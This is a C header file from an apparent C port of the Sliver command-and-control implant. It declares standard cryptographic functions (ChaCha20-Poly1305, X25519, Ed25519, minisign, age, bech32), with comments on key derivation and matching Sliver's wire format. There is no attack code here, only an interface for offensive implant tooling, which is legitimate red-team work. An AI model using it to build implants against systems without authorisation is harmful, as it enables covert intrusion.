/* sliver/crypto.h - cryptographic primitives used by the implant runtime.
 *
 * Backends:
 *   mbedTLS 3.6   TLS 1.3, SHA-256/HMAC/HKDF, ChaCha20-Poly1305, X25519
 *   monocypher    Ed25519, BLAKE2b (parameterised output)
 *
 * Every function returns 0 on success and a negative value on failure; no
 * function allocates unless it explicitly returns a buffer.
 */
#ifndef SLIVER_CRYPTO_H
#define SLIVER_CRYPTO_H

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

#define SLIVER_SHA256_LEN 32
#define SLIVER_ED25519_PK_LEN 32
#define SLIVER_ED25519_SIG_LEN 64
#define SLIVER_X25519_LEN 32
#define SLIVER_CHACHAPOLY_KEY_LEN 32
#define SLIVER_CHACHAPOLY_NONCE_LEN 12
#define SLIVER_CHACHAPOLY_TAG_LEN 16
#define SLIVER_MINISIGN_RAW_SIG_LEN 74

/* --- randomness --------------------------------------------------------- */
int sliver_random_bytes(void *buf, size_t len);

/* --- hashes / KDF ------------------------------------------------------- */
int sliver_sha256(const void *data, size_t len, unsigned char out[SLIVER_SHA256_LEN]);
int sliver_hmac_sha256(const void *key, size_t key_len, const void *data, size_t data_len,
                       unsigned char out[SLIVER_SHA256_LEN]);
int sliver_hkdf_sha256(const void *salt, size_t salt_len,
                       const void *ikm, size_t ikm_len,
                       const void *info, size_t info_len,
                       void *out, size_t out_len);
int sliver_blake2b(const void *data, size_t len, unsigned char *out, size_t out_len);

/* --- AEAD (IETF ChaCha20-Poly1305, 12 byte nonce, 16 byte tag) ---------- */
/* out must hold plaintext_len + 16 bytes (tag appended). */
int sliver_chachapoly_seal(const unsigned char key[SLIVER_CHACHAPOLY_KEY_LEN],
                           const unsigned char nonce[SLIVER_CHACHAPOLY_NONCE_LEN],
                           const void *aad, size_t aad_len,
                           const void *plaintext, size_t plaintext_len,
                           unsigned char *out);
/* in_len includes the trailing 16 byte tag. */
int sliver_chachapoly_open(const unsigned char key[SLIVER_CHACHAPOLY_KEY_LEN],
                           const unsigned char nonce[SLIVER_CHACHAPOLY_NONCE_LEN],
                           const void *aad, size_t aad_len,
                           const void *ciphertext, size_t ciphertext_len,
                           unsigned char *out);

/* --- X25519 ------------------------------------------------------------- */
int sliver_x25519_keypair(unsigned char secret[SLIVER_X25519_LEN], unsigned char public_key[SLIVER_X25519_LEN]);
int sliver_x25519_shared(const unsigned char secret[SLIVER_X25519_LEN],
                         const unsigned char peer_public[SLIVER_X25519_LEN],
                         unsigned char shared[SLIVER_X25519_LEN]);

/* --- Ed25519 ------------------------------------------------------------ */
/* Sliver derives the signing key from a 32 byte seed (SHA256 of the age
 * private key string), so the API is seed based. */
int sliver_ed25519_public_from_seed(const unsigned char seed[32], unsigned char public_key[SLIVER_ED25519_PK_LEN]);
int sliver_ed25519_sign(const unsigned char seed[32], const void *msg, size_t len,
                        unsigned char sig[SLIVER_ED25519_SIG_LEN]);
int sliver_ed25519_verify(const unsigned char public_key[SLIVER_ED25519_PK_LEN],
                          const void *msg, size_t len,
                          const unsigned char sig[SLIVER_ED25519_SIG_LEN]);

/* --- minisign (raw 74 byte signatures) ---------------------------------- */
/* pubkey_text is the two line minisign public key file injected at build time
 * ("untrusted comment: ...\n<base64>"). */
int sliver_minisign_keyid(const unsigned char public_key[32], uint64_t *key_id);
int sliver_minisign_raw_verify(const char *pubkey_text,
                               const unsigned char raw_sig[SLIVER_MINISIGN_RAW_SIG_LEN],
                               const void *msg, size_t msg_len);

/* --- age (Sliver flavour, X25519 recipient) ----------------------------- */
/* The Sliver protocol trims the 32 byte "age-encryption.org/v1\n-> X25519 "
 * prefix from the ciphertext and re-adds it on decrypt; these helpers do the
 * same so the wire format matches the Go implementation byte for byte. */
/* recipient_public_key is the bech32 "age1..." string. */
int sliver_age_encrypt(const char *recipient_public_key,
                       const void *plaintext, size_t plaintext_len,
                       unsigned char **out, size_t *out_len);
/* identity is the bech32 "AGE-SECRET-KEY-1..." string. Caller frees *out. */
int sliver_age_decrypt(const char *identity,
                       const void *ciphertext, size_t ciphertext_len,
                       unsigned char **out, size_t *out_len);

/* --- bech32 (age key strings, not bech32m) ------------------------------ */
/* Decodes an arbitrary length bech32 payload (checksum verified).
 * Returns 0 on success; out_len is in/out (capacity in, length out). */
int sliver_bech32_decode(const char *str, uint8_t *out, size_t *out_len);
int sliver_bech32_encode(const char *hrp, const uint8_t *data, size_t data_len,
                         char *out, size_t out_cap);

/* --- misc --------------------------------------------------------------- */
void sliver_secure_zero(void *buf, size_t len);

#ifdef __cplusplus
}
#endif

#endif /* SLIVER_CRYPTO_H */
